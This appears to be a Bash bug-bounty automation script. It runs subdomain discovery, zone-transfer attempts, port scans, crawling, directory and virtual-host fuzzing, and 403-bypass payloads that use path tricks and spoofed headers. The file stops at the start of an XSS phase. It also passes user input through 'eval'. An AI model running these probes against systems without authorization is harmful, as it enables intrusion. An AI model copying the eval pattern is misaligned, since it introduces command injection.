#!/bin/bash
# ============================================================
#  BEAST MODE v3.0 — FULL AUTO BUG BOUNTY PIPELINE
#  Usage: ./bugbounty_beast.sh <domain> [OPTIONS]
#
#  Options:
#    --discord  <webhook_url>      Discord notifications
#    --telegram <token> <chat_id>  Telegram notifications
#    --slack    <webhook_url>      Slack notifications
#    --cookie   <cookie_string>    Auth cookie for scanning
#    --proxy    <proxy_url>        Proxy (e.g. http://127.0.0.1:8080)
#    --rate     <int>              Requests/sec limit (default: 50)
#    --threads  <int>              Thread count (default: 50)
#    --wordlist <path>             Custom dir-fuzz wordlist
#    --resume                      Resume interrupted scan
#    --deep                        Deep scan (slower, more thorough)
#    --scope    <file>             File with extra in-scope domains
#
#  Examples:
#    ./bugbounty_beast.sh example.com
#    ./bugbounty_beast.sh example.com --discord https://discord.com/api/webhooks/xxx
#    ./bugbounty_beast.sh example.com --cookie 'session=abc123' --proxy http://127.0.0.1:8080
#    ./bugbounty_beast.sh example.com --resume --deep
# ============================================================

set -uo pipefail

# ── Colors ────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; BLUE='\033[0;34m'
BOLD='\033[1m'; NC='\033[0m'

banner()  { echo -e "\n${CYAN}${BOLD}╔══ $1 ══╗${NC}"; }
ok()      { echo -e "  ${GREEN}✓${NC} $1"; }
warn()    { echo -e "  ${YELLOW}⚠${NC}  $1"; }
fail()    { echo -e "  ${RED}✗${NC} $1"; }
found()   { echo -e "  ${MAGENTA}${BOLD}★ FOUND:${NC} $1"; tee -a "$OUT/reports/all_findings.txt" <<< "$1" > /dev/null; }
info()    { echo -e "  ${BLUE}ℹ${NC}  $1"; }
sep()     { echo -e "${CYAN}───────────────────────────────────────────────────────────${NC}"; }

# ── Args ──────────────────────────────────────────────────────
if [[ $# -lt 1 ]]; then
  echo -e "${RED}Usage: $0 <target_domain> [options]${NC}"
  echo -e "${YELLOW}Run with --help for full option list${NC}"
  exit 1
fi

if [[ "$1" == "--help" || "$1" == "-h" ]]; then
  head -30 "$0" | grep -E "^#" | sed 's/^# *//'
  exit 0
fi

TARGET="$1"; shift

# Defaults
DISCORD_WEBHOOK=""; TELEGRAM_TOKEN=""; TELEGRAM_CHAT=""
SLACK_WEBHOOK=""; COOKIE=""; PROXY=""; RATE=50
THREADS=50; WORDLIST=""; RESUME=false; DEEP=false; SCOPE_FILE=""

while [[ $# -gt 0 ]]; do
  case "$1" in
    --discord)   DISCORD_WEBHOOK="$2";  shift 2 ;;
    --telegram)  TELEGRAM_TOKEN="$2"; TELEGRAM_CHAT="$3"; shift 3 ;;
    --slack)     SLACK_WEBHOOK="$2";   shift 2 ;;
    --cookie)    COOKIE="$2";          shift 2 ;;
    --proxy)     PROXY="$2";           shift 2 ;;
    --rate)      RATE="$2";            shift 2 ;;
    --threads)   THREADS="$2";         shift 2 ;;
    --wordlist)  WORDLIST="$2";        shift 2 ;;
    --scope)     SCOPE_FILE="$2";      shift 2 ;;
    --resume)    RESUME=true;          shift ;;
    --deep)      DEEP=true;            shift ;;
    *) shift ;;
  esac
done

# ── Paths ─────────────────────────────────────────────────────
GOBIN="$HOME/go/bin"
export PATH="$PATH:$GOBIN:/usr/local/go/bin"

BASE_DIR="$HOME/bugbounty"
OUT="$BASE_DIR/$TARGET/$(date +%Y%m%d_%H%M%S)"
[[ "$RESUME" == true ]] && {
  LATEST=$(ls -dt "$BASE_DIR/$TARGET"/* 2>/dev/null | head -1)
  [[ -n "$LATEST" ]] && OUT="$LATEST" && info "Resuming scan: $OUT"
}

mkdir -p "$OUT"/{recon,subs,live,vuln,fuzzing,screenshots,reports,xss,sqli,ssrf,js,lfi,cors,ssti,headers,takeover,cloud,smuggling,cmdi,xxe,vhost,graphql,params,crawl,openredirect,crlf,websocket,hostinject}

CHECKPOINT="$OUT/.checkpoint"
START_TIME=$(date +%s)

# ── File paths ────────────────────────────────────────────────
SUBS_ALL="$OUT/subs/all_subs.txt"
SUBS_RESOLVED="$OUT/subs/resolved_subs.txt"
LIVE_URLS="$OUT/live/live_urls.txt"
LIVE_HOSTS="$OUT/live/live_hosts.txt"
KNOWN_URLS="$OUT/recon/known_urls.txt"
PARAM_URLS="$OUT/recon/param_urls.txt"
CRAWLED_URLS="$OUT/crawl/all_crawled.txt"
NUCLEI_OUT="$OUT/vuln/nuclei_results.txt"
NUCLEI_JSON="$OUT/vuln/nuclei_results.jsonl"
ALL_URLS="$OUT/recon/all_urls_combined.txt"
> "$SUBS_ALL"; > "$OUT/reports/all_findings.txt"

# ── Wordlists ─────────────────────────────────────────────────
WORDLIST_DIR="/usr/share/seclists"
WL_COMMON="$WORDLIST_DIR/Discovery/Web-Content/common.txt"
WL_RAFT="$WORDLIST_DIR/Discovery/Web-Content/raft-medium-directories.txt"
WL_DNS_SMALL="/opt/wordlists/dns_small.txt"
WL_DNS_MED="/opt/wordlists/dns_medium.txt"
WL_RESOLVERS="/opt/wordlists/resolvers.txt"
WL_API="$WORDLIST_DIR/Discovery/Web-Content/api/api-endpoints.txt"
WL_LFI="/opt/wordlists/lfi.txt"
WL_VHOSTS="/opt/wordlists/vhosts.txt"
WL_SSTI="/opt/wordlists/ssti_payloads.txt"

# Use custom wordlist if provided
[[ -n "$WORDLIST" && -f "$WORDLIST" ]] && WL_COMMON="$WORDLIST"

# Fallback mini wordlist if seclists not found
if [[ ! -f "$WL_COMMON" ]]; then
  WL_COMMON="$OUT/fuzzing/mini.txt"
  cat > "$WL_COMMON" << 'WEOF'
admin login api backup config .env wp-admin phpmyadmin upload files
dashboard test dev staging debug hidden secret .git .svn robots.txt
sitemap.xml phpinfo.php server-status server-info .htaccess crossdomain.xml
api/v1 api/v2 api/v3 graphql swagger swagger-ui.html api-docs redoc
panel administrator manager console portal internal private beta
WEOF
fi

# ── Curl helpers ──────────────────────────────────────────────
CURL_OPTS="-sk --max-time 10 -A 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'"
[[ -n "$COOKIE" ]]  && CURL_OPTS+=" -H 'Cookie: $COOKIE'"
[[ -n "$PROXY" ]]   && CURL_OPTS+=" --proxy '$PROXY'"

safe_curl() { eval "curl $CURL_OPTS $*" 2>/dev/null || true; }

# ── Notify helpers ────────────────────────────────────────────
notify_discord() {
  [[ -z "$DISCORD_WEBHOOK" ]] && return
  curl -s -X POST "$DISCORD_WEBHOOK" \
    -H "Content-Type: application/json" \
    -d "{\"content\": \"🐉 **[$TARGET]** $1\"}" &>/dev/null || true
}

notify_telegram() {
  [[ -z "$TELEGRAM_TOKEN" || -z "$TELEGRAM_CHAT" ]] && return
  curl -s "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
    -d "chat_id=${TELEGRAM_CHAT}" -d "text=🐉 [$TARGET] $1" \
    -d "parse_mode=Markdown" &>/dev/null || true
}

notify_slack() {
  [[ -z "$SLACK_WEBHOOK" ]] && return
  curl -s -X POST "$SLACK_WEBHOOK" \
    -H "Content-Type: application/json" \
    -d "{\"text\": \"🐉 *[$TARGET]* $1\"}" &>/dev/null || true
}

notify() {
  notify_discord "$1"
  notify_telegram "$1"
  notify_slack "$1"
}

# ── Resume helper ─────────────────────────────────────────────
phase_done() { echo "$1" >> "$CHECKPOINT"; }
phase_skip() { grep -q "^$1$" "$CHECKPOINT" 2>/dev/null; }

run_phase() {
  local phase_id="$1"; local phase_label="$2"; shift 2
  if $RESUME && phase_skip "$phase_id"; then
    warn "Skipping $phase_label (checkpoint — already done)"
    return 0
  fi
  banner "$phase_label"
  "$@"
  phase_done "$phase_id"
  sep
}

# ── Tool check ────────────────────────────────────────────────
has()    { command -v "$1" &>/dev/null || [[ -f "$HOME/go/bin/$1" ]]; }
has_py() { [[ -f "/opt/$1/$1.py" ]] || [[ -f "/opt/$1/main.py" ]]; }
run_go() { local t="$1"; shift; has "$t" && "$HOME/go/bin/$t" "$@" || "$t" "$@"; }

# ── INIT ──────────────────────────────────────────────────────
echo -e "\n${CYAN}${BOLD}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║           BEAST MODE v3.0 🐉  INITIALIZING          ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "  Target:   ${BOLD}$TARGET${NC}"
echo -e "  Output:   ${BOLD}$OUT${NC}"
echo -e "  Time:     ${BOLD}$(date)${NC}"
echo -e "  Deep:     ${BOLD}$DEEP${NC}"
echo -e "  Resume:   ${BOLD}$RESUME${NC}"
[[ -n "$COOKIE" ]]  && echo -e "  Cookie:   ${BOLD}SET${NC}"
[[ -n "$PROXY" ]]   && echo -e "  Proxy:    ${BOLD}$PROXY${NC}"
sep

notify "🚀 Scan started on \`$TARGET\`"

# Tool inventory
TOOLS_CHECKED=(subfinder httpx nuclei ffuf nmap curl jq gowitness dalfox
               dnsx katana gospider hakrawler gau waybackurls puredns
               subzy crlfuzz interactsh-client kxss arjun sqlmap)
MISSING=()
for t in "${TOOLS_CHECKED[@]}"; do
  has "$t" && ok "$t" || { warn "$t missing"; MISSING+=("$t"); }
done
[[ ${#MISSING[@]} -gt 0 ]] && warn "Missing: ${MISSING[*]} — run setup_beast.sh"
sep

# ═════════════════════════════════════════════════════════════
phase_1() {
# PHASE 1 — SUBDOMAIN ENUMERATION
# ═════════════════════════════════════════════════════════════

  # Subfinder
  if has subfinder; then
    subfinder -d "$TARGET" -silent -all -o "$OUT/subs/subfinder.txt" 2>/dev/null || true
    cat "$OUT/subs/subfinder.txt" >> "$SUBS_ALL" 2>/dev/null || true
    ok "Subfinder: $(wc -l < "$OUT/subs/subfinder.txt" 2>/dev/null || echo 0) subs"
  fi

  # Assetfinder
  if has assetfinder; then
    assetfinder --subs-only "$TARGET" 2>/dev/null > "$OUT/subs/assetfinder.txt" || true
    cat "$OUT/subs/assetfinder.txt" >> "$SUBS_ALL" 2>/dev/null || true
    ok "Assetfinder: $(wc -l < "$OUT/subs/assetfinder.txt" 2>/dev/null || echo 0) subs"
  fi

  # Amass passive
  if has amass; then
    timeout 120 amass enum -passive -d "$TARGET" -o "$OUT/subs/amass.txt" 2>/dev/null || true
    cat "$OUT/subs/amass.txt" >> "$SUBS_ALL" 2>/dev/null || true
    ok "Amass: $(wc -l < "$OUT/subs/amass.txt" 2>/dev/null || echo 0) subs"
  fi

  # crt.sh
  curl -s "https://crt.sh/?q=%25.$TARGET&output=json" 2>/dev/null \
    | jq -r '.[].name_value' 2>/dev/null \
    | sed 's/\*\.//g' | sort -u > "$OUT/subs/crtsh.txt" || true
  cat "$OUT/subs/crtsh.txt" >> "$SUBS_ALL" 2>/dev/null || true
  ok "crt.sh: $(wc -l < "$OUT/subs/crtsh.txt" 2>/dev/null || echo 0) subs"

  # HackerTarget API
  curl -s "https://api.hackertarget.com/hostsearch/?q=$TARGET" 2>/dev/null \
    | cut -d',' -f1 > "$OUT/subs/hackertarget.txt" 2>/dev/null || true
  cat "$OUT/subs/hackertarget.txt" >> "$SUBS_ALL" 2>/dev/null || true

  # ThreatCrowd
  curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$TARGET" 2>/dev/null \
    | jq -r '.subdomains[]' 2>/dev/null >> "$OUT/subs/threatcrowd.txt" || true
  cat "$OUT/subs/threatcrowd.txt" >> "$SUBS_ALL" 2>/dev/null || true

  # AlienVault OTX
  curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$TARGET/passive_dns" 2>/dev/null \
    | jq -r '.passive_dns[].hostname' 2>/dev/null \
    | grep -F ".$TARGET" >> "$OUT/subs/alienvault.txt" 2>/dev/null || true
  cat "$OUT/subs/alienvault.txt" >> "$SUBS_ALL" 2>/dev/null || true

  # Extra subs from scope file
  [[ -n "$SCOPE_FILE" && -f "$SCOPE_FILE" ]] && cat "$SCOPE_FILE" >> "$SUBS_ALL"

  # Dedup
  grep -F ".$TARGET\|^$TARGET" "$SUBS_ALL" | sort -u > "$OUT/subs/subs_cleaned.txt" 2>/dev/null || sort -u "$SUBS_ALL" > "$OUT/subs/subs_cleaned.txt"
  mv "$OUT/subs/subs_cleaned.txt" "$SUBS_ALL"

  # Alterx — permutation-based subs
  if has alterx; then
    echo "$TARGET" | alterx -silent 2>/dev/null | head -500 >> "$SUBS_ALL" || true
    sort -u "$SUBS_ALL" -o "$SUBS_ALL"
  fi

  # Active DNS brute force (puredns if wordlist exists)
  if has puredns && [[ -f "$WL_DNS_SMALL" && -f "$WL_RESOLVERS" ]]; then
    WL="$WL_DNS_SMALL"
    $DEEP && [[ -f "$WL_DNS_MED" ]] && WL="$WL_DNS_MED"
    puredns bruteforce "$WL" "$TARGET" \
      --resolvers "$WL_RESOLVERS" \
      --write "$OUT/subs/puredns.txt" \
      --quiet 2>/dev/null || true
    cat "$OUT/subs/puredns.txt" >> "$SUBS_ALL" 2>/dev/null || true
    ok "Puredns brute: $(wc -l < "$OUT/subs/puredns.txt" 2>/dev/null || echo 0) subs"
  fi

  # DNS resolution to filter live subs
  if has dnsx; then
    dnsx -l "$SUBS_ALL" -silent -a -resp-only \
      -o "$SUBS_RESOLVED" 2>/dev/null || cp "$SUBS_ALL" "$SUBS_RESOLVED"
    ok "DNS resolved: $(wc -l < "$SUBS_RESOLVED" 2>/dev/null || echo 0) valid subs"
  else
    cp "$SUBS_ALL" "$SUBS_RESOLVED"
  fi

  sort -u "$SUBS_ALL" -o "$SUBS_ALL"
  TOTAL_SUBS=$(wc -l < "$SUBS_ALL")
  ok "Total unique subdomains: $TOTAL_SUBS"
  notify "📡 Phase 1 done — *$TOTAL_SUBS subdomains* found"
}

# ═════════════════════════════════════════════════════════════
phase_dns() {
# PHASE 1.5 — DNS RECON (zone transfer, SPF/DMARC, ASN)
# ═════════════════════════════════════════════════════════════

  DNS_OUT="$OUT/recon/dns"
  mkdir -p "$DNS_OUT"

  # Zone transfer attempt
  ok "Testing DNS zone transfer..."
  for ns in $(dig NS "$TARGET" +short 2>/dev/null); do
    result=$(dig AXFR "$TARGET" "@$ns" 2>/dev/null || true)
    if echo "$result" | grep -q "XFR size"; then
      found "Zone transfer SUCCESS on $ns"
      echo "$result" > "$DNS_OUT/zonetransfer_${ns}.txt"
      notify "🚨 DNS ZONE TRANSFER — \`$ns\` on $TARGET!"
    fi
  done

  # SPF/DMARC/DKIM
  ok "Checking email security..."
  dig TXT "$TARGET" +short 2>/dev/null > "$DNS_OUT/txt_records.txt" || true
  dig TXT "_dmarc.$TARGET" +short 2>/dev/null > "$DNS_OUT/dmarc.txt" || true
  dig TXT "_domainkey.$TARGET" +short 2>/dev/null > "$DNS_OUT/dkim.txt" || true

  if ! grep -qi "v=spf" "$DNS_OUT/txt_records.txt" 2>/dev/null; then
    found "No SPF record found — email spoofing possible"
  fi
  if ! grep -qi "v=DMARC" "$DNS_OUT/dmarc.txt" 2>/dev/null; then
    found "No DMARC record found — email spoofing possible"
  fi

  # ASN & IP range
  if has asnmap; then
    asnmap -d "$TARGET" -silent 2>/dev/null > "$DNS_OUT/asn.txt" || true
    ok "ASN info → $DNS_OUT/asn.txt"
  fi

  # TLS cert info (expiry, SANs)
  if has tlsx; then
    echo "$TARGET" | tlsx -silent -san -cn -json 2>/dev/null \
      > "$DNS_OUT/tls_info.json" || true
    # Extract extra domains from SANs
    jq -r '.san[]' "$DNS_OUT/tls_info.json" 2>/dev/null \
      | grep -F "$TARGET" >> "$SUBS_ALL" || true
    sort -u "$SUBS_ALL" -o "$SUBS_ALL"
    ok "TLS SANs extracted"
  fi

  # WHOIS
  whois "$TARGET" > "$DNS_OUT/whois.txt" 2>/dev/null || true

  ok "DNS recon complete → $DNS_OUT/"
}

# ═════════════════════════════════════════════════════════════
phase_2() {
# PHASE 2 — LIVE HOST PROBING
# ═════════════════════════════════════════════════════════════

  HTTPX_ARGS="-silent -status-code -title -tech-detect -content-length -follow-redirects -threads $THREADS -rate-limit $RATE"
  [[ -n "$COOKIE" ]]  && HTTPX_ARGS+=" -H 'Cookie: $COOKIE'"
  [[ -n "$PROXY" ]]   && HTTPX_ARGS+=" -proxy $PROXY"

  if has httpx; then
    eval "httpx -l '$SUBS_ALL' $HTTPX_ARGS -o '$OUT/live/httpx_full.txt'" 2>/dev/null || true

    awk '{print $1}' "$OUT/live/httpx_full.txt" > "$LIVE_URLS" 2>/dev/null || true
    sed 's|https\?://||' "$LIVE_URLS" | cut -d/ -f1 > "$LIVE_HOSTS" 2>/dev/null || true

    grep " \[200\]"  "$OUT/live/httpx_full.txt" > "$OUT/live/live_200.txt" 2>/dev/null || true
    grep " \[403\]"  "$OUT/live/httpx_full.txt" > "$OUT/live/403_bypass_candidates.txt" 2>/dev/null || true
    grep " \[401\]"  "$OUT/live/httpx_full.txt" > "$OUT/live/401_auth_endpoints.txt" 2>/dev/null || true
    grep " \[302\]\| \[301\]" "$OUT/live/httpx_full.txt" > "$OUT/live/redirects.txt" 2>/dev/null || true

    LIVE_COUNT=$(wc -l < "$LIVE_URLS" 2>/dev/null || echo 0)
    ok "Live hosts: $LIVE_COUNT"
    notify "🌐 Phase 2 done — *$LIVE_COUNT live hosts*"
  else
    sed "s|^|https://|" "$SUBS_ALL" > "$LIVE_URLS"
  fi
}

# ═════════════════════════════════════════════════════════════
phase_security_headers() {
# PHASE 2.5 — SECURITY HEADERS CHECK
# ═════════════════════════════════════════════════════════════

  HEADERS_MISSING="$OUT/headers/missing_headers.txt"
  > "$HEADERS_MISSING"

  SECURITY_HEADERS=(
    "Strict-Transport-Security"
    "X-Frame-Options"
    "X-Content-Type-Options"
    "Content-Security-Policy"
    "X-XSS-Protection"
    "Referrer-Policy"
    "Permissions-Policy"
  )

  ok "Checking security headers on live hosts..."
  head -20 "$LIVE_URLS" | while read -r url; do
    resp_headers=$(safe_curl "-I '$url'" 2>/dev/null || true)
    for h in "${SECURITY_HEADERS[@]}"; do
      if ! echo "$resp_headers" | grep -qi "$h"; then
        echo "MISSING $h: $url" >> "$HEADERS_MISSING"
      fi
    done

    # Clickjacking check
    if ! echo "$resp_headers" | grep -qi "X-Frame-Options\|frame-ancestors"; then
      found "Clickjacking (no X-Frame-Options): $url"
      echo "CLICKJACKING: $url" >> "$OUT/headers/clickjacking.txt"
    fi

    # Cookie flags check
    if echo "$resp_headers" | grep -qi "Set-Cookie"; then
      cookies=$(echo "$resp_headers" | grep -i "Set-Cookie")
      echo "$cookies" | grep -iv "httponly" && \
        echo "COOKIE_NO_HTTPONLY: $url — $cookies" >> "$OUT/headers/cookie_issues.txt" || true
      echo "$cookies" | grep -iv "secure;" && \
        echo "COOKIE_NO_SECURE: $url — $cookies" >> "$OUT/headers/cookie_issues.txt" || true
    fi
  done

  MISS_COUNT=$(wc -l < "$HEADERS_MISSING" 2>/dev/null || echo 0)
  ok "Security header issues: $MISS_COUNT"
  [[ $MISS_COUNT -gt 0 ]] && found "Missing security headers: $MISS_COUNT instances"
}

# ═════════════════════════════════════════════════════════════
phase_3() {
# PHASE 3 — SCREENSHOTS
# ═════════════════════════════════════════════════════════════

  if has gowitness && [[ -f "$LIVE_URLS" ]]; then
    gowitness scan file \
      -f "$LIVE_URLS" \
      --screenshot-path "$OUT/screenshots" \
      --timeout 10 --threads 5 2>/dev/null || true
    SHOT_COUNT=$(ls "$OUT/screenshots"/*.png 2>/dev/null | wc -l || echo 0)
    ok "Screenshots: $SHOT_COUNT → $OUT/screenshots/"
    notify "📸 Phase 3 done — *$SHOT_COUNT screenshots*"
  else
    warn "gowitness not found — skipping"
  fi
}

# ═════════════════════════════════════════════════════════════
phase_4() {
# PHASE 4 — PORT SCAN
# ═════════════════════════════════════════════════════════════

  if [[ ! -f "$LIVE_HOSTS" ]]; then
    warn "No live hosts — skipping port scan"
    return
  fi

  SCAN_TARGETS="$OUT/recon/nmap_targets.txt"
  head -20 "$LIVE_HOSTS" > "$SCAN_TARGETS"

  # naabu (fast) → nmap (deep service detect)
  if has naabu; then
    naabu -l "$SCAN_TARGETS" \
      -top-ports 1000 -silent -rate "$RATE" \
      -o "$OUT/recon/naabu_ports.txt" 2>/dev/null || true
    ok "Naabu: $(wc -l < "$OUT/recon/naabu_ports.txt" 2>/dev/null || echo 0) open ports"
  fi

  if has nmap; then
    nmap -iL "$SCAN_TARGETS" \
      -T3 --top-ports 1000 -sV --open \
      -oN "$OUT/recon/nmap_results.txt" \
      -oX "$OUT/recon/nmap_results.xml" 2>/dev/null || true

    OPEN_PORTS=$(grep -c "^[0-9]" "$OUT/recon/nmap_results.txt" 2>/dev/null || echo 0)
    ok "Nmap: $OPEN_PORTS open ports"

    # Flag interesting services
    grep -E "ftp|telnet|smtp|rdp|vnc|redis|mongodb|elastic|memcached" \
      "$OUT/recon/nmap_results.txt" 2>/dev/null \
      | tee "$OUT/recon/interesting_services.txt" \
      | while read -r line; do found "Interesting service: $line"; done || true

    notify "🔌 Phase 4 done — *$OPEN_PORTS ports*"
  fi
}

# ═════════════════════════════════════════════════════════════
phase_5() {
# PHASE 5 — URL COLLECTION
# ═════════════════════════════════════════════════════════════

  > "$KNOWN_URLS"

  # Wayback Machine
  curl -s "http://web.archive.org/cdx/search/cdx?url=*.$TARGET/*&output=text&fl=original&collapse=urlkey&limit=20000" \
    2>/dev/null >> "$KNOWN_URLS" || warn "Wayback unavailable"

  has waybackurls && echo "$TARGET" | waybackurls 2>/dev/null >> "$KNOWN_URLS" || true
  has gau && gau --subs "$TARGET" 2>/dev/null >> "$KNOWN_URLS" || true

  # Common Crawl
  curl -s "https://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.$TARGET/*&output=json" 2>/dev/null \
    | jq -r '.url' 2>/dev/null >> "$KNOWN_URLS" || true

  # URLScan.io
  curl -s "https://urlscan.io/api/v1/search/?q=domain:$TARGET&size=200" 2>/dev/null \
    | jq -r '.results[].task.url' 2>/dev/null >> "$KNOWN_URLS" || true

  # Dedup
  has uro && sort -u "$KNOWN_URLS" | uro 2>/dev/null > "$KNOWN_URLS.dedup" && mv "$KNOWN_URLS.dedup" "$KNOWN_URLS" || sort -u "$KNOWN_URLS" -o "$KNOWN_URLS"

  ok "Known URLs: $(wc -l < "$KNOWN_URLS")"

  # Classify interesting files and endpoints
  grep -E "\.(js|json|env|config|backup|bak|sql|xml|yaml|yml|log|txt|php|asp|aspx)(\?|$)" \
    "$KNOWN_URLS" > "$OUT/recon/interesting_files.txt" 2>/dev/null || true
  grep -iE "(api|admin|login|dashboard|auth|token|secret|key|upload|config|debug|test|dev|staging|graphql|swagger|v1|v2|v3)" \
    "$KNOWN_URLS" > "$OUT/recon/interesting_endpoints.txt" 2>/dev/null || true
  grep "?" "$KNOWN_URLS" | sort -u > "$PARAM_URLS" 2>/dev/null || true

  ok "Interesting files: $(wc -l < "$OUT/recon/interesting_files.txt" 2>/dev/null || echo 0)"
  ok "Param URLs: $(wc -l < "$PARAM_URLS" 2>/dev/null || echo 0)"
}

# ═════════════════════════════════════════════════════════════
phase_crawl() {
# PHASE 5.5 — WEB CRAWLING
# ═════════════════════════════════════════════════════════════

  > "$CRAWLED_URLS"
  KATANA_ARGS="-jc -silent -depth 3 -c 10 -rl $RATE -timeout 10 -crawl-duration 120"
  $DEEP && KATANA_ARGS="-jc -silent -depth 5 -c 20 -rl $RATE -timeout 15 -crawl-duration 300"
  [[ -n "$COOKIE" ]] && KATANA_ARGS+=" -H 'Cookie: $COOKIE'"

  if has katana && [[ -f "$LIVE_URLS" ]]; then
    ok "Katana crawling $(wc -l < "$LIVE_URLS") hosts..."
    head -30 "$LIVE_URLS" | while read -r url; do
      eval "katana -u '$url' $KATANA_ARGS 2>/dev/null" >> "$CRAWLED_URLS" || true
    done
    ok "Katana: $(wc -l < "$CRAWLED_URLS") URLs"
  fi

  if has gospider && [[ -f "$LIVE_URLS" ]]; then
    gospider -S "$LIVE_URLS" -c 10 -d 3 -t 20 \
      --js --sitemap --robots \
      -o "$OUT/crawl/gospider" \
      --quiet 2>/dev/null || true
    find "$OUT/crawl/gospider" -type f -exec cat {} + 2>/dev/null \
      | grep -oP 'https?://[^\s"<>]+' >> "$CRAWLED_URLS" || true
    ok "Gospider complete"
  fi

  if has hakrawler && [[ -f "$LIVE_URLS" ]]; then
    head -20 "$LIVE_URLS" | hakrawler -subs -d 3 \
      2>/dev/null >> "$CRAWLED_URLS" || true
  fi

  # Merge everything
  cat "$KNOWN_URLS" "$CRAWLED_URLS" 2>/dev/null | sort -u > "$ALL_URLS"
  grep "?" "$ALL_URLS" | sort -u >> "$PARAM_URLS"
  sort -u "$PARAM_URLS" -o "$PARAM_URLS"

  ok "Total URLs (known+crawled): $(wc -l < "$ALL_URLS")"
  ok "Param URLs total: $(wc -l < "$PARAM_URLS")"
}

# ═════════════════════════════════════════════════════════════
phase_params() {
# PHASE 6 — PARAMETER DISCOVERY (arjun)
# ═════════════════════════════════════════════════════════════

  if ! has arjun; then
    warn "arjun not installed — skipping param discovery"
    return
  fi

  ok "Running Arjun parameter discovery..."
  head -20 "$LIVE_URLS" | while read -r url; do
    SAFE=$(echo "$url" | sed 's|https\?://||;s|[/:]|_|g')
    arjun -u "$url" \
      -m GET,POST \
      -t 10 --passive \
      -oJ "$OUT/params/arjun_${SAFE}.json" \
      -q 2>/dev/null || true
  done

  # Extract discovered params and build URLs
  find "$OUT/params" -name "*.json" -exec jq -r '.params[]' {} + 2>/dev/null \
    | sort -u > "$OUT/params/all_params.txt" || true

  ok "Discovered params: $(wc -l < "$OUT/params/all_params.txt" 2>/dev/null || echo 0)"
}

# ═════════════════════════════════════════════════════════════
phase_6() {
# PHASE 6 — DIRECTORY FUZZING + 403 BYPASS
# ═════════════════════════════════════════════════════════════

  if ! has ffuf; then
    warn "ffuf not found — skipping fuzzing"
    return
  fi

  FFUF_ARGS="-mc 200,201,204,301,302,401,403 -t 40 -timeout 5 -s"
  [[ -n "$COOKIE" ]]  && FFUF_ARGS+=" -H 'Cookie: $COOKIE'"
  [[ -n "$PROXY" ]]   && FFUF_ARGS+=" -x $PROXY"

  FUZZ_COUNT=0
  head -15 "$LIVE_URLS" | while read -r url; do
    SAFE=$(echo "$url" | sed 's|https\?://||;s|[/:]|_|g')

    # Standard fuzz
    eval "ffuf -u '${url}/FUZZ' -w '$WL_COMMON' $FFUF_ARGS \
      -o '$OUT/fuzzing/ffuf_${SAFE}.json' -of json" 2>/dev/null || true

    # API-specific fuzz
    [[ -f "$WL_API" ]] && \
    eval "ffuf -u '${url}/FUZZ' -w '$WL_API' $FFUF_ARGS \
      -o '$OUT/fuzzing/ffuf_api_${SAFE}.json' -of json" 2>/dev/null || true

    ((FUZZ_COUNT++))
  done

  # 403 bypass
  if [[ -f "$OUT/live/403_bypass_candidates.txt" ]]; then
    ok "Attempting 403 bypasses..."
    awk '{print $1}' "$OUT/live/403_bypass_candidates.txt" | head -20 | while read -r url; do
      path=$(echo "$url" | grep -oP '(?<=://)[^/]+(/.*)?$' | cut -d/ -f2-)
      host=$(echo "$url" | grep -oP '(?<=://)[^/]+')
      base="${url%%$path}"

      for bypass in \
        "%2e/${path}" "/${path}/." "//${path}//" "./${path}/." \
        "/${path}%20" "/${path}%09" "/${path}?" \
        "/${path}#" "/${path}/~" \
        "/${path}..;/" "/${path};/"; do
        resp=$(safe_curl "-o /dev/null -w '%{http_code}' '${base}${bypass}'" 2>/dev/null || echo "000")
        [[ "$resp" == "200" ]] && {
          found "403 Bypass → 200: ${base}${bypass}"
          echo "${base}${bypass}" >> "$OUT/fuzzing/403_bypassed.txt"
        }
      done

      # Header-based bypass
      for hdr in \
        "X-Original-URL: /$path" \
        "X-Rewrite-URL: /$path" \
        "X-Custom-IP-Authorization: 127.0.0.1" \
        "X-Forwarded-For: 127.0.0.1" \
        "X-Forwarded-Host: 127.0.0.1" \
        "X-Host: 127.0.0.1"; do
        resp=$(safe_curl "-o /dev/null -w '%{http_code}' -H '$hdr' '$url'" 2>/dev/null || echo "000")
        [[ "$resp" == "200" ]] && {
          found "403 Header Bypass ($hdr): $url"
          echo "$url | $hdr" >> "$OUT/fuzzing/403_bypassed.txt"
        }
      done
    done
  fi

  ok "Fuzzing complete → $OUT/fuzzing/"
  notify "📂 Phase 6 done — fuzzing complete"
}

# ═════════════════════════════════════════════════════════════
phase_vhost() {
# PHASE 6.5 — VIRTUAL HOST FUZZING
# ═════════════════════════════════════════════════════════════

  if ! has ffuf || [[ ! -f "$WL_VHOSTS" ]]; then
    warn "ffuf/vhost wordlist missing — skipping vhost fuzz"
    return
  fi

  TARGET_IP=$(dig +short "$TARGET" | head -1 2>/dev/null || true)
  [[ -z "$TARGET_IP" ]] && { warn "Cannot resolve IP — skipping vhost"; return; }

  ok "Fuzzing virtual hosts on $TARGET_IP..."
  ffuf -u "http://$TARGET_IP/" \
    -H "Host: FUZZ.$TARGET" \
    -w "$WL_VHOSTS" \
    -mc 200,201,204,301,302,401,403 \
    -fs 0 -t 50 -s \
    -o "$OUT/vhost/vhost_results.json" -of json 2>/dev/null || true

  VHOST_COUNT=$(jq '.results | length' "$OUT/vhost/vhost_results.json" 2>/dev/null || echo 0)
  ok "Vhosts discovered: $VHOST_COUNT"
  [[ $VHOST_COUNT -gt 0 ]] && {
    found "Virtual hosts found: $VHOST_COUNT — $OUT/vhost/vhost_results.json"
    jq -r '.results[].input.Host' "$OUT/vhost/vhost_results.json" 2>/dev/null >> "$SUBS_ALL" || true
  }
}

# ═════════════════════════════════════════════════════════════
phase_7() {
# PHASE 7 — XSS SCANNING
# ═════════════════════════════════════════════════════════════

  XSS_TARGETS="$OUT/xss/xss_targets.txt"
  grep "?" "$ALL_URLS" 2>/dev/null | head -300 > "$XSS_TARGETS" || \
  head -200 "$PARAM_URLS" > "$XSS_TARGETS" 2>/dev/null

  # kxss — fast reflection check first
